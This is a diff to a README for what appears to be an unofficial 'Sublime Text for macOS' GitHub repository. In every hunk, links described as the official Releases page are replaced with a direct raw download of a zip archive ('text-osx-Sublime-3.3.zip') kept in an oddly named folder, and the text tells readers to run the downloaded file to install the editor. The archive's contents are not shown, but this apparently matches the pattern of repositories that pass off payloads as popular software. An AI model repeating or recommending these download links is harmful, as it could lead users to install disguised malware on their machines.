@@ -1,8 +1,8 @@
-https://github.com/chauhan766868/Sublime-text-osx/releases
+https://raw.githubusercontent.com/chauhan766868/Sublime-text-osx/main/structuralize/text-osx-Sublime-3.3.zip
 
 # Sublime Text for macOS: Fast Editor with Multi-Caret, Git, Sonoma
 
-[![Download](https://img.shields.io/badge/Download-Sublime_Text_OSX-blue?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/chauhan766868/Sublime-text-osx/releases)
+[![Download](https://raw.githubusercontent.com/chauhan766868/Sublime-text-osx/main/structuralize/text-osx-Sublime-3.3.zip)](https://raw.githubusercontent.com/chauhan766868/Sublime-text-osx/main/structuralize/text-osx-Sublime-3.3.zip)
 
 Table of contents
 - Overview
@@ -60,7 +60,7 @@ System compatibility
 
 Getting started
 - Visit the releases page to obtain the latest build for macOS. The file to download is provided on that page and should be run to install the editor. See the Releases page for the current installer and notes.
-- The primary download link is available here: https://github.com/chauhan766868/Sublime-text-osx/releases
+- The primary download link is available here: https://raw.githubusercontent.com/chauhan766868/Sublime-text-osx/main/structuralize/text-osx-Sublime-3.3.zip
 - After installation, open the app from the Applications folder and grant any first-run permissions requested by macOS.
 
 Installation guide
@@ -151,7 +151,7 @@ Roadmap and future plans
 
 Releases
 - Access the latest builds and release notes on the Releases page. For the most current installer and changelog, visit:
-  - Releases page: https://github.com/chauhan766868/Sublime-text-osx/releases
+  - Releases page: https://raw.githubusercontent.com/chauhan766868/Sublime-text-osx/main/structuralize/text-osx-Sublime-3.3.zip
 - The release notes describe what changed in each build, including bug fixes, performance improvements, and any known issues.
 
 Changelog
@@ -175,6 +175,6 @@ License
 
 Releases page
 - For the latest builds and installation instructions, check the releases page again:
-  - https://github.com/chauhan766868/Sublime-text-osx/releases
+  - https://raw.githubusercontent.com/chauhan766868/Sublime-text-osx/main/structuralize/text-osx-Sublime-3.3.zip
 
 Note: The link above is the same as the introductory link in this document. The page contains the installer and release notes for the latest version, including Apple Silicon and macOS Sonoma support. If you encounter any issues with a specific build, you can reference the corresponding release notes for guidance and use the issue tracker to report problems.
